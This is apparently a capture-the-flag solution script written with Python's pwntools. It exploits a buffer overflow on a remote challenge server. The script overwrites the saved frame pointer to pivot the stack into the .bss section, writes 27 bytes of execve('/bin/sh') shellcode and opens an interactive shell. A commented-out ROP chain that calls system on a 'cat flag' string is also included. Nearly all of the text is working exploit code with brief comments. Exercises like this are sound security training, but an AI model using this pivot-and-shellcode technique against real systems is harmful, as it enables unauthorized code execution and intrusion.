# RazviOverflow
# Python3

# Stack Pivoting

from pwn import * 

pop_rax_ret = p64(0x0000000000401001)
mov_rdi_rax_call_system = p64(0x00401245)
cat_flag_str = p64(0x00402000)

leave_ret = p64(0x000000000040124e)
end_of_bss_section = 0x00404010


binary = remote("pwn.chall.pwnoh.io", 13379)

vuln_address = p64(0x00401250)

print(binary.recv())

# read() inputs it from rbp-0x20 and reads 0x38 bytes

# leave; ret; is equivalent to:
# mov rsp, rbp
# pop rbp
# ret

payload = b"A"*0x20 + p64(end_of_bss_section + 0x50) + p64(0x401268)
binary.sendline(payload)
print(binary.recv())


## Now rbp will point to 0x00404010 + 0x50.
## The beginning of vuln section will perform a push rbp, moving rsp to address 0x00404010 -0x50.
## When the 2nd iteration of vuln will write into memory the shellcode, it will write starting at
## 0x00404010 + 0x50 + 0x4 - 0x20. That's the address to return to.

shellcode_address_in_memory = p64(end_of_bss_section + 0x50 - 0x20 + 0x08 + 0x08)

# Shellcode is 27 bytes (0x1B)
shellcode = b"A"*0x08 + shellcode_address_in_memory + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode

#payload = pop_rax_ret + cat_flag_str + mov_rdi_rax_call_system + b"A" * (0x20-0x1b) + b"B" * 0x08 + p64(0x403fc0)

binary.sendline(payload)
binary.interactive()